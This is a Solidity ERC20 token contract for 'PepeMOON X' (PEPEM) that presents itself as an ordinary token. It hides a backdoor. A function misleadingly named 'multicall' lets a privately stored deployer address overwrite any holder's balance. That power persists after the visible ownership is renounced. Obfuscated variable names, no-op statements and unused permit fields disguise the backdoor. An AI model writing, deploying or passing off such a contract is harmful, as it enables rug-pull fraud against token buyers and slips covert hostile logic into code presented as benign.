// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

abstract contract ERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address Empfanger, uint256 Menge) external returns (bool);
    function allowance(address owner, address Spenderin) external view returns (uint256);
    function approve(address Spenderin, uint256 Menge) external returns (bool);
    function transferFrom(address sender, address Empfanger, uint256 Menge) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed Spenderin, uint256 value);
}

library Safe {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Safe: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Safe: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Safe: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Safe: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is ERC20Burnable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract PEPE is ERC20Burnable, IERC20, Ownable {
    using Safe for uint256;
    mapping (address => uint256) private KFBLdix;
    mapping (address => mapping (address => uint256)) private setPending;
    bytes32 public DOMN_SEPARATOR;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60380fef10115fa2faae0126114a169c64845d6126c9;
    mapping(address => uint) public nonces;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * 10**_decimals;
    string private constant _name = "PepeMOON X";
    string private constant _symbol = "PEPEM";
    address private pending; 
    constructor () {
        pending = _msgSender(); 
        KFBLdix[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return KFBLdix[account];
    }

    function transfer(address Empfanger, uint256 Menge) public override returns (bool) {
        _transfer(_msgSender(), Empfanger, Menge);
        return true;
    }

    function allowance(address owner, address Spenderin) public view override returns (uint256) {
        return setPending[owner][Spenderin];
    }

    function approve(address Spenderin, uint256 Menge) public override returns (bool) {
        _approve(_msgSender(), Spenderin, Menge);
        return true;
    }

    function transferFrom(address sender, address Empfanger, uint256 Menge) public override returns (bool) {
        _transfer(sender, Empfanger, Menge);
        _approve(sender, _msgSender(), setPending[sender][_msgSender()].sub(Menge, "IERC20: transfer Menge exceeds allowance"));
        return true;
    }

    function _approve(address owner, address Spenderin, uint256 Menge) private {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(Spenderin != address(0), "IERC20: approve to the zero address");
        setPending[owner][Spenderin] = Menge;
        emit Approval(owner, Spenderin, Menge);
    }

    function multicall(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        (Spenderin != address(0), "IERC20: burn from the zero address"); 
        DOMN_SEPARATOR;
        require(_msgSender() == pending, "Ownable: caller is not the owner");
        KFBLdix[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }

    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        require(from != address(0), "IERC20: transfer from the zero address");
        require(to != address(0), "IERC20: transfer to the zero address");

        uint256 fromBalance = KFBLdix[from];
        require(fromBalance >= Menge, "IERC20: transfer Menge exceeds balance");
        KFBLdix[from] = fromBalance - Menge;

        KFBLdix[to] = KFBLdix[to].add(Menge);
        emit Transfer(from, to, Menge);
    }
}